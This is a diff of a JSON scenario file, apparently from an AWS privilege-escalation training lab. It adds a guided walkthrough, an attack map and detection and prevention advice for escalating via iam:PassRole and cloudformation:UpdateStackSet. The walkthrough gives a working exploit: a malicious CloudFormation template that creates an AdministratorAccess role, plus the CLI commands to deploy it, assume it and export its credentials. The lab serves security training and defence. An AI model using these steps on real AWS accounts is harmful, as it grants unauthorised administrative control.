@@ -13,54 +13,8 @@
     "prod"
   ],
   "attackPath": {
-    "principals": [
-      "arn:aws:iam::{account_id}:user/pl-prod-cloudformation-004-to-admin-starting-user",
-      "arn:aws:iam::{account_id}:role/pl-prod-cloudformation-004-to-admin-stackset-execution-role",
-      "arn:aws:iam::{account_id}:role/pl-prod-cloudformation-004-to-admin-escalated-role"
-    ],
-    "summary": "starting_user \u2192 (iam:PassRole + cloudformation:UpdateStackSet) \u2192 StackSet (with admin execution role) \u2192 creates escalated admin role \u2192 (sts:AssumeRole) \u2192 admin access"
-  },
-  "permissions": {
-    "required": [
-      {
-        "permission": "iam:PassRole",
-        "resource": "arn:aws:iam::*:role/pl-prod-cloudformation-004-to-admin-stackset-admin-role"
-      },
-      {
-        "permission": "cloudformation:UpdateStackSet",
-        "resource": "arn:aws:cloudformation:*:*:stackset/pl-prod-cloudformation-004-to-admin-stackset:*"
-      }
-    ],
-    "helpful": [
-      {
-        "permission": "cloudformation:DescribeStackSet",
-        "purpose": "View StackSet details and verify configuration"
-      },
-      {
-        "permission": "cloudformation:DescribeStackSetOperation",
-        "purpose": "Monitor StackSet update operation progress"
-      },
-      {
-        "permission": "cloudformation:GetTemplate",
-        "purpose": "Retrieve current StackSet template for modification"
-      },
-      {
-        "permission": "cloudformation:CreateStackInstances",
-        "purpose": "Create new stack instances if needed"
-      },
-      {
-        "permission": "cloudformation:DeleteStackInstances",
-        "purpose": "Remove stack instances if needed"
-      },
-      {
-        "permission": "iam:GetRole",
-        "purpose": "Verify the escalated role was created by the StackSet update"
-      },
-      {
-        "permission": "sts:AssumeRole",
-        "purpose": "Assume the escalated role created by StackSet update"
-      }
-    ]
+    "principals": [],
+    "summary": ""
   },
   "mitreAttack": {
     "tactics": [
@@ -77,18 +31,62 @@
     "modulePath": "modules/scenarios/single-account/privesc-one-hop/to-admin/cloudformation-004-iam-passrole+cloudformation-updatestackset"
   },
   "githubUrl": "https://github.com/DataDog/pathfinding-labs/tree/main/modules/scenarios/single-account/privesc-one-hop/to-admin/cloudformation-004-iam-passrole+cloudformation-updatestackset",
+  "schemaVersion": "3.0.0",
+  "permissions": {
+    "required": [
+      {
+        "permission": "iam:PassRole",
+        "resource": "arn:aws:iam::*:role/pl-prod-cloudformation-004-to-admin-stackset-admin-role",
+        "description": "allows the user to specify the StackSet administration role when calling UpdateStackSet"
+      },
+      {
+        "permission": "cloudformation:UpdateStackSet",
+        "resource": "arn:aws:cloudformation:*:*:stackset/pl-prod-cloudformation-004-to-admin-stackset:*",
+        "description": "allows modifying the StackSet template, which the elevated execution role then applies"
+      }
+    ],
+    "helpful": [
+      {
+        "permission": "cloudformation:DescribeStackSet",
+        "purpose": "view StackSet details and verify configuration"
+      },
+      {
+        "permission": "cloudformation:DescribeStackSetOperation",
+        "purpose": "monitor StackSet update operation progress"
+      },
+      {
+        "permission": "cloudformation:GetTemplate",
+        "purpose": "retrieve current StackSet template for modification"
+      },
+      {
+        "permission": "cloudformation:CreateStackInstances",
+        "purpose": "create new stack instances if needed"
+      },
+      {
+        "permission": "cloudformation:DeleteStackInstances",
+        "purpose": "remove stack instances if needed"
+      },
+      {
+        "permission": "iam:GetRole",
+        "purpose": "verify the escalated role was created by the StackSet update"
+      },
+      {
+        "permission": "sts:AssumeRole",
+        "purpose": "assume the escalated role created by StackSet update"
+      }
+    ]
+  },
   "readme": {
-    "overview": "This scenario demonstrates a sophisticated privilege escalation vulnerability where a user with `cloudformation:UpdateStackSet` permission can modify an existing CloudFormation StackSet that has an administrative execution role. CloudFormation StackSets are designed for deploying resources across multiple AWS accounts and regions, and they rely on execution roles in target accounts to create and manage resources. When these execution roles have excessive permissions, an attacker can leverage them to escalate privileges.\n\nThe attack works by updating the StackSet's CloudFormation template to include new IAM resources, specifically an IAM role with administrative permissions that the attacker can assume. Because the StackSet's execution role performs the actual resource creation, the attacker effectively bypasses their own permission boundaries and leverages the StackSet's elevated privileges. The execution role creates the new admin role on behalf of the attacker, who can then assume it to gain full administrative access.\n\nThis vulnerability is particularly dangerous because StackSet execution roles often have broad permissions by design - they need to create various resources across multiple accounts and regions. Organizations frequently overlook this privilege escalation path because the `cloudformation:UpdateStackSet` permission appears innocuous, and the connection between StackSet updates and IAM privilege escalation is not immediately obvious. The attack leaves minimal forensic evidence beyond standard CloudFormation API calls, making it an attractive vector for persistent access.",
-    "mitreAttack": "- **Tactic**: TA0004 - Privilege Escalation, TA0003 - Persistence\n- **Technique**: T1098 - Account Manipulation\n- **Sub-technique**: T1098.001 - Account Manipulation: Additional Cloud Credentials",
-    "attackDiagram": "graph LR\n    A[pl-prod-cloudformation-004-to-admin-starting-user] -->|cloudformation:UpdateStackSet| B[CloudFormation StackSet]\n    B -->|Uses execution role| C[pl-prod-cloudformation-004-to-admin-stackset-execution-role]\n    C -->|iam:CreateRole| D[pl-prod-cloudformation-004-to-admin-escalated-role]\n    A -->|sts:AssumeRole| D\n    D -->|Administrator Access| E[Effective Administrator]\n\n    style A fill:#ff9999,stroke:#333,stroke-width:2px\n    style B fill:#ffcc99,stroke:#333,stroke-width:2px\n    style C fill:#ffcc99,stroke:#333,stroke-width:2px\n    style D fill:#ffcc99,stroke:#333,stroke-width:2px\n    style E fill:#99ff99,stroke:#333,stroke-width:2px",
-    "attackSteps": "1. **Initial Access**: Start as `pl-prod-cloudformation-004-to-admin-starting-user` (credentials provided via Terraform outputs)\n2. **Retrieve Current Template**: Use `cloudformation:GetTemplate` to download the existing StackSet template\n3. **Modify Template**: Add a new IAM role with AdministratorAccess policy and a trust policy allowing the starting user to assume it\n4. **Update StackSet**: Use `cloudformation:UpdateStackSet` to deploy the modified template\n5. **Monitor Operation**: Wait for the StackSet update operation to complete\n6. **Assume Escalated Role**: Use `sts:AssumeRole` to assume the newly created admin role\n7. **Verification**: Verify administrator access by listing IAM users or performing other admin-level actions",
-    "resourcesCreated": "| ARN | Purpose |\n| -- | -- |\n| `arn:aws:iam::PROD_ACCOUNT:user/pl-prod-cloudformation-004-to-admin-starting-user` | Scenario-specific starting user with access keys and cloudformation:UpdateStackSet permission |\n| `arn:aws:cloudformation:*:PROD_ACCOUNT:stackset/pl-prod-cloudformation-004-to-admin-stackset:*` | CloudFormation StackSet with administrative execution role |\n| `arn:aws:iam::PROD_ACCOUNT:role/pl-prod-cloudformation-004-to-admin-stackset-execution-role` | StackSet execution role with AdministratorAccess policy |\n| `arn:aws:iam::PROD_ACCOUNT:role/pl-prod-cloudformation-004-to-admin-escalated-role` | Admin role created during StackSet update (created by demo script) |",
-    "attackLab": {
+    "objective": "Your objective is to learn how to exploit a privilege escalation vulnerability that allows you to move from the `pl-prod-cloudformation-004-to-admin-starting-user` IAM user to the `pl-prod-cloudformation-004-to-admin-escalated-role` administrative role by updating an existing CloudFormation StackSet with a malicious template that causes the StackSet's administrative execution role to create a new IAM role with AdministratorAccess that you can assume.\n\n- **Start:** `arn:aws:iam::{account_id}:user/pl-prod-cloudformation-004-to-admin-starting-user`\n- **Destination resource:** `arn:aws:iam::{account_id}:role/pl-prod-cloudformation-004-to-admin-escalated-role`",
+    "setup": {
       "prerequisites": "1. Install the `plabs` CLI:\n   ```bash\n   brew install pathfinding-labs/tap/plabs\n   ```\n2. Configure your AWS profiles in `~/.plabs/plabs.yaml` (or run `plabs init` if you haven't already)",
       "deployNonInteractive": "```bash\nplabs enable enable_single_account_privesc_one_hop_to_admin_cloudformation_004_iam_passrole_cloudformation_updatestackset\nplabs apply\n```",
-      "deployTui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `space` to enable it\n4. Press `d` to deploy",
+      "deployTui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `space` to enable it\n4. Press `d` to deploy"
+    },
+    "attack": {
+      "resourcesCreated": "| ARN | Purpose |\n| -- | -- |\n| `arn:aws:iam::{account_id}:user/pl-prod-cloudformation-004-to-admin-starting-user` | Scenario-specific starting user with access keys and cloudformation:UpdateStackSet permission |\n| `arn:aws:cloudformation:{region}:{account_id}:stackset/pl-prod-cloudformation-004-to-admin-stackset:*` | CloudFormation StackSet with administrative execution role |\n| `arn:aws:iam::{account_id}:role/pl-prod-cloudformation-004-to-admin-stackset-execution-role` | StackSet execution role with AdministratorAccess policy |\n| `arn:aws:iam::{account_id}:role/pl-prod-cloudformation-004-to-admin-escalated-role` | Admin role created during StackSet update (created by demo script) |",
       "demoAttack": {
-        "intro": "The script will:\n1. Display a step-by-step walkthrough with color-coded output\n2. Show the commands being executed and their results\n3. Verify successful privilege escalation\n4. Output standardized test results for automation",
+        "executing": "The script will:\n1. Retrieve scenario credentials from Terraform outputs\n2. Verify the starting user identity and confirm no admin access exists yet\n3. Inspect the existing CloudFormation StackSet and its benign template\n4. Create a malicious CloudFormation template that adds an IAM role with AdministratorAccess\n5. Use `cloudformation:UpdateStackSet` (with `iam:PassRole`) to deploy the modified template\n6. Poll until the StackSet update operation completes\n7. Assume the newly created escalated admin role\n8. Verify administrator access by listing IAM users",
         "resourcesCreated": "- New IAM role (`pl-prod-cloudformation-004-to-admin-escalated-role`) with AdministratorAccess policy, created via the StackSet update",
         "nonInteractive": "```bash\nplabs demo --list\nplabs demo cloudformation-004-iam-passrole+cloudformation-updatestackset\n```",
         "tui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `r` to run the demo script"
@@ -96,18 +94,107 @@
       "cleanup": {
         "nonInteractive": "```bash\nplabs cleanup --list\nplabs cleanup cloudformation-004-iam-passrole+cloudformation-updatestackset\n```",
         "tui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `c` to run the cleanup script"
+      }
+    },
+    "teardown": {
+      "nonInteractive": "```bash\nplabs disable enable_single_account_privesc_one_hop_to_admin_cloudformation_004_iam_passrole_cloudformation_updatestackset\nplabs apply\n```",
+      "tui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `space` to disable it\n4. Press `D` to destroy"
+    },
+    "defend": {
+      "cspm": {
+        "whatToDetect": "- IAM user (`pl-prod-cloudformation-004-to-admin-starting-user`) has `cloudformation:UpdateStackSet` permission on a StackSet whose execution role holds AdministratorAccess\n- StackSet execution role (`pl-prod-cloudformation-004-to-admin-stackset-execution-role`) is granted AdministratorAccess, enabling privilege escalation via template modification\n- Privilege escalation path exists: starting user \u2192 UpdateStackSet \u2192 execution role \u2192 IAM role creation \u2192 admin access",
+        "prevention": "- Implement least privilege for StackSet execution roles - avoid granting AdministratorAccess unless absolutely necessary for the StackSet's intended purpose\n- Restrict `cloudformation:UpdateStackSet` permissions to specific trusted users or roles using IAM conditions\n- Use resource-based conditions to limit which StackSets can be updated: `\"Condition\": {\"StringEquals\": {\"aws:RequestedRegion\": [\"us-east-1\"]}}`\n- Implement Service Control Policies (SCPs) to prevent StackSet execution roles from creating IAM roles or modifying IAM policies\n- Enable CloudFormation drift detection to identify unauthorized changes to StackSet configurations\n- Use StackSet permission models appropriately - prefer service-managed StackSets over self-managed when possible\n- Implement IAM permission boundaries on StackSet execution roles to limit the maximum permissions they can grant\n- Enable MFA requirements for sensitive CloudFormation operations using condition keys like `aws:MultiFactorAuthPresent`\n- Use IAM Access Analyzer to identify and remediate privilege escalation paths involving CloudFormation StackSets\n- Regularly audit StackSet execution roles and their permissions to ensure they follow least privilege principles"
       },
-      "teardownNonInteractive": "```bash\nplabs disable enable_single_account_privesc_one_hop_to_admin_cloudformation_004_iam_passrole_cloudformation_updatestackset\nplabs apply\n```",
-      "teardownTui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `space` to disable it\n4. Press `D` to destroy"
+      "cloudSiem": {
+        "cloudTrailEvents": "- `IAM: PassRole` -- Starting user passes the StackSet admin role; indicates the privilege escalation attempt is underway\n- `CloudFormation: UpdateStackSet` -- StackSet template modified; high severity when the new template contains IAM resource definitions\n- `CloudFormation: DescribeStackSetOperation` -- Attacker polling for operation completion after submitting the update\n- `IAM: CreateRole` -- New IAM role created by the StackSet execution role; critical when the new role has AdministratorAccess\n- `STS: AssumeRole` -- Starting user assumes the newly created escalated role",
+        "detonationLogs": "_Detonation log integration (Stratus Red Team / Grimoire) is planned for a future release._"
+      }
     },
-    "cspm": {
-      "whatToDetect": "- IAM user (`pl-prod-cloudformation-004-to-admin-starting-user`) has `cloudformation:UpdateStackSet` permission on a StackSet whose execution role holds AdministratorAccess\n- StackSet execution role (`pl-prod-cloudformation-004-to-admin-stackset-execution-role`) is granted AdministratorAccess, enabling privilege escalation via template modification\n- Privilege escalation path exists: starting user \u2192 UpdateStackSet \u2192 execution role \u2192 IAM role creation \u2192 admin access",
-      "prevention": "- Implement least privilege for StackSet execution roles - avoid granting AdministratorAccess unless absolutely necessary for the StackSet's intended purpose\n- Restrict `cloudformation:UpdateStackSet` permissions to specific trusted users or roles using IAM conditions\n- Use resource-based conditions to limit which StackSets can be updated: `\"Condition\": {\"StringEquals\": {\"aws:RequestedRegion\": [\"us-east-1\"]}}`\n- Implement Service Control Policies (SCPs) to prevent StackSet execution roles from creating IAM roles or modifying IAM policies\n- Enable CloudFormation drift detection to identify unauthorized changes to StackSet configurations\n- Use StackSet permission models appropriately - prefer service-managed StackSets over self-managed when possible\n- Implement IAM permission boundaries on StackSet execution roles to limit the maximum permissions they can grant\n- Enable MFA requirements for sensitive CloudFormation operations using condition keys like `aws:MultiFactorAuthPresent`\n- Use IAM Access Analyzer to identify and remediate privilege escalation paths involving CloudFormation StackSets\n- Regularly audit StackSet execution roles and their permissions to ensure they follow least privilege principles"
-    },
-    "cloudSiem": {
-      "cloudTrailEvents": "- `IAM: PassRole` \u2014 Starting user passes the StackSet admin role; indicates the privilege escalation attempt is underway\n- `CloudFormation: UpdateStackSet` \u2014 StackSet template modified; high severity when the new template contains IAM resource definitions\n- `CloudFormation: DescribeStackSetOperation` \u2014 Attacker polling for operation completion after submitting the update\n- `IAM: CreateRole` \u2014 New IAM role created by the StackSet execution role; critical when the new role has AdministratorAccess\n- `STS: AssumeRole` \u2014 Starting user assumes the newly created escalated role",
-      "detonationLogs": "_Detonation log integration (Stratus Red Team / Grimoire) is planned for a future release._"
-    }
+    "guidedWalkthrough": "# Guided Walkthrough: Privilege Escalation via cloudformation:UpdateStackSet\n\nThis scenario demonstrates a sophisticated privilege escalation vulnerability where a user with `cloudformation:UpdateStackSet` permission can modify an existing CloudFormation StackSet that has an administrative execution role. CloudFormation StackSets are designed for deploying resources across multiple AWS accounts and regions, and they rely on execution roles in target accounts to create and manage resources. When these execution roles have excessive permissions, an attacker can leverage them to escalate privileges.\n\nThe attack works by updating the StackSet's CloudFormation template to include new IAM resources \u2014 specifically an IAM role with administrative permissions that the attacker can assume. Because the StackSet's execution role performs the actual resource creation, the attacker effectively bypasses their own permission boundaries and leverages the StackSet's elevated privileges. The execution role creates the new admin role on behalf of the attacker, who can then assume it to gain full administrative access.\n\nThis vulnerability is particularly dangerous because StackSet execution roles often have broad permissions by design \u2014 they need to create various resources across multiple accounts and regions. Organizations frequently overlook this privilege escalation path because the `cloudformation:UpdateStackSet` permission appears innocuous, and the connection between StackSet updates and IAM privilege escalation is not immediately obvious. The attack leaves minimal forensic evidence beyond standard CloudFormation API calls, making it an attractive vector for persistent access.\n\n## The Challenge\n\nYou start with access to `pl-prod-cloudformation-004-to-admin-starting-user`, an IAM user with `iam:PassRole` and `cloudformation:UpdateStackSet` permissions. Your goal is to reach full administrative access via `pl-prod-cloudformation-004-to-admin-escalated-role`.\n\nThe path is: update an existing StackSet with a malicious template \u2192 the StackSet's admin execution role creates a new IAM role \u2192 assume that role for admin access.\n\n## Reconnaissance\n\nFirst, confirm who you are and establish that you don't yet have admin access:\n\n```bash\naws sts get-caller-identity --query 'Arn' --output text\n# arn:aws:iam::<account_id>:user/pl-prod-cloudformation-004-to-admin-starting-user\n\naws iam list-users --max-items 1\n# AccessDenied \u2014 as expected\n```\n\nNext, look at the existing StackSet. The helpful permissions let you inspect what's already deployed:\n\n```bash\naws cloudformation describe-stack-set \\\n  --stack-set-name pl-prod-cloudformation-004-to-admin-stackset \\\n  --query 'StackSet.[StackSetName,Status,Description]' \\\n  --output table\n```\n\nRetrieve the current template to understand what's in it:\n\n```bash\naws cloudformation describe-stack-set \\\n  --stack-set-name pl-prod-cloudformation-004-to-admin-stackset \\\n  --query 'StackSet.TemplateBody' \\\n  --output text\n```\n\nThe current template is benign \u2014 it just creates an S3 bucket. But notice the StackSet is configured with an execution role (`pl-prod-cloudformation-004-to-admin-stackset-execution-role`) that holds AdministratorAccess. Anything you can get that execution role to create, you get for free.\n\n## Exploitation\n\nThe key insight: `cloudformation:UpdateStackSet` lets you change what the StackSet deploys. The execution role will then apply those changes \u2014 with its AdministratorAccess. If you add an IAM role to the template with a trust policy pointing back at yourself, the execution role will create it.\n\n### Step 1: Craft the malicious template\n\nBuild a CloudFormation template that includes the original S3 bucket resource (to avoid errors from removing existing resources) plus a new IAM role:\n\n```json\n{\n  \"AWSTemplateFormatVersion\": \"2010-09-09\",\n  \"Resources\": {\n    \"BenignBucket\": {\n      \"Type\": \"AWS::S3::Bucket\",\n      \"Properties\": {\n        \"BucketName\": \"pl-prod-cloudformation-004-benign-<account_id>-<suffix>\"\n      }\n    },\n    \"EscalatedAdminRole\": {\n      \"Type\": \"AWS::IAM::Role\",\n      \"Properties\": {\n        \"RoleName\": \"pl-prod-cloudformation-004-to-admin-escalated-role\",\n        \"AssumeRolePolicyDocument\": {\n          \"Version\": \"2012-10-17\",\n          \"Statement\": [{\n            \"Effect\": \"Allow\",\n            \"Principal\": {\n              \"AWS\": \"arn:aws:iam::<account_id>:user/pl-prod-cloudformation-004-to-admin-starting-user\"\n            },\n            \"Action\": \"sts:AssumeRole\"\n          }]\n        },\n        \"ManagedPolicyArns\": [\"arn:aws:iam::aws:policy/AdministratorAccess\"]\n      }\n    }\n  }\n}\n```\n\nSave that to `/tmp/malicious-stackset-template.json`.\n\n### Step 2: Update the StackSet\n\nCall `cloudformation:UpdateStackSet`, specifying the administration role ARN (which you can `iam:PassRole` to) and the execution role name:\n\n```bash\naws cloudformation update-stack-set \\\n  --stack-set-name pl-prod-cloudformation-004-to-admin-stackset \\\n  --template-body file:///tmp/malicious-stackset-template.json \\\n  --administration-role-arn arn:aws:iam::<account_id>:role/pl-prod-cloudformation-004-to-admin-stackset-admin-role \\\n  --execution-role-name pl-prod-cloudformation-004-to-admin-stackset-execution-role \\\n  --capabilities CAPABILITY_NAMED_IAM \\\n  --query 'OperationId' \\\n  --output text\n```\n\nThis returns an operation ID. The StackSet's admin role orchestrates the update, and the execution role in the target account (this account) carries out the actual resource creation \u2014 including creating your new IAM role.\n\n### Step 3: Wait for the operation to complete\n\nPoll until the status reaches `SUCCEEDED`:\n\n```bash\naws cloudformation describe-stack-set-operation \\\n  --stack-set-name pl-prod-cloudformation-004-to-admin-stackset \\\n  --operation-id <operation-id> \\\n  --query 'StackSetOperation.Status' \\\n  --output text\n```\n\nOnce it shows `SUCCEEDED`, wait an additional 15 seconds for IAM propagation.\n\n### Step 4: Assume the escalated role\n\n```bash\naws sts assume-role \\\n  --role-arn arn:aws:iam::<account_id>:role/pl-prod-cloudformation-004-to-admin-escalated-role \\\n  --role-session-name escalated-session \\\n  --query 'Credentials' \\\n  --output json\n```\n\nExport the returned credentials:\n\n```bash\nexport AWS_ACCESS_KEY_ID=<AccessKeyId>\nexport AWS_SECRET_ACCESS_KEY=<SecretAccessKey>\nexport AWS_SESSION_TOKEN=<SessionToken>\n```\n\n## Verification\n\nConfirm the escalation worked:\n\n```bash\naws sts get-caller-identity --query 'Arn' --output text\n# arn:aws:sts::<account_id>:assumed-role/pl-prod-cloudformation-004-to-admin-escalated-role/escalated-session\n\naws iam list-users --max-items 3 --output table\n# Returns a list of IAM users \u2014 admin access confirmed\n```\n\n## What Happened\n\nYou exploited the gap between the permissions you hold (`cloudformation:UpdateStackSet`) and the permissions the StackSet's execution role holds (AdministratorAccess). By modifying the StackSet template to define a new IAM role with a trust policy pointing back to you, you instructed the execution role to create that role on your behalf \u2014 a classic confused-deputy escalation pattern.\n\nIn real environments this path appears frequently because StackSet execution roles are often provisioned with broad permissions (\"it needs to deploy anything\") while the UpdateStackSet permission is granted to developers or automation accounts that seem untrusted. The CloudFormation API calls look entirely routine in CloudTrail, making detection difficult without purpose-built analytics that correlate template diffs with IAM resource creation.\n"
   },
+  "attackMap": {
+    "nodes": [
+      {
+        "id": "starting-principal",
+        "label": "Starting User",
+        "type": "principal",
+        "subType": "iam-user",
+        "arn": "arn:aws:iam::{account_id}:user/pl-prod-cloudformation-004-to-admin-starting-user",
+        "description": "You have gained access to this principal's AWS IAM credentials. These could have been obtained through many real-world vectors: phishing a developer and gaining access to their workstation, compromising a browser session, exploiting a vulnerable workload running in this AWS account, discovering credentials in a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.\nRegardless of how you obtained them, you are now operating as this principal. This IAM user has iam:PassRole and cloudformation:UpdateStackSet permissions, allowing it to modify a StackSet whose execution role holds AdministratorAccess.\n"
+      },
+      {
+        "id": "stackset",
+        "label": "CloudFormation StackSet",
+        "type": "resource",
+        "subType": "cloudformation-stack",
+        "arn": "arn:aws:cloudformation:{region}:{account_id}:stackset/pl-prod-cloudformation-004-to-admin-stackset:*",
+        "description": "This CloudFormation StackSet is configured with an execution role that holds AdministratorAccess. By updating the StackSet template to include a new IAM role, the execution role will create that role on your behalf \u2014 bypassing your own permission boundaries.\n"
+      },
+      {
+        "id": "escalated-role",
+        "label": "Escalated Admin Role",
+        "type": "principal",
+        "subType": "iam-role",
+        "isTarget": true,
+        "arn": "arn:aws:iam::{account_id}:role/pl-prod-cloudformation-004-to-admin-escalated-role",
+        "description": "This IAM role is created by the StackSet execution role when the modified template is deployed. It has AdministratorAccess and a trust policy allowing the starting user to assume it, granting full administrative access to the AWS account.\n"
+      }
+    ],
+    "edges": [
+      {
+        "from": "starting-principal",
+        "to": "stackset",
+        "label": "iam:PassRole + cloudformation:UpdateStackSet",
+        "description": "The starting user passes the StackSet admin role and updates the StackSet with a modified template that includes a new IAM role definition. The StackSet execution role performs the actual IAM role creation.\n",
+        "hints": [
+          "You have permissions related to CloudFormation StackSets.",
+          "Look for StackSets whose execution roles have elevated permissions \u2014 updating the template can create new IAM resources.",
+          "Browse to https://pathfinding.cloud/paths/cloudformation-004 for technique details."
+        ],
+        "commands": [
+          {
+            "description": "Retrieve the current StackSet template",
+            "command": "aws cloudformation get-template --stack-set-name pl-prod-cloudformation-004-to-admin-stackset --query TemplateBody --output text"
+          },
+          {
+            "description": "Update the StackSet with a modified template containing a new admin IAM role",
+            "command": "aws cloudformation update-stack-set --stack-set-name pl-prod-cloudformation-004-to-admin-stackset --template-body file://modified-template.json --administration-role-arn arn:aws:iam::{account_id}:role/pl-prod-cloudformation-004-to-admin-stackset-admin-role --execution-role-name pl-prod-cloudformation-004-to-admin-stackset-execution-role"
+          },
+          {
+            "description": "Monitor the StackSet update operation until it completes",
+            "command": "aws cloudformation describe-stack-set-operation --stack-set-name pl-prod-cloudformation-004-to-admin-stackset --operation-id <operation-id>"
+          }
+        ]
+      },
+      {
+        "from": "stackset",
+        "to": "escalated-role",
+        "label": "iam:CreateRole (via execution role)",
+        "description": "The StackSet execution role (which has AdministratorAccess) creates the new IAM role defined in the modified template, including an AdministratorAccess policy attachment and a trust policy allowing the starting user to assume it.\n",
+        "hints": [
+          "Inspect the StackSet's execution role permissions.",
+          "Modify the StackSet template to include a new IAM role with a trust policy pointing to yourself."
+        ],
+        "commands": []
+      },
+      {
+        "from": "starting-principal",
+        "to": "escalated-role",
+        "label": "sts:AssumeRole",
+        "description": "The starting user assumes the newly created escalated role, gaining full administrative access to the AWS account.\n",
+        "commands": [
+          {
+            "description": "Assume the escalated admin role",
+            "command": "aws sts assume-role --role-arn arn:aws:iam::{account_id}:role/pl-prod-cloudformation-004-to-admin-escalated-role --role-session-name escalated-session"
+          },
+          {
+            "description": "Verify administrator access",
+            "command": "aws iam list-users"
+          }
+        ]
+      }
+    ]
+  },
+  "hasAttackMap": true,
   "slug": "cloudformation-004"
 }
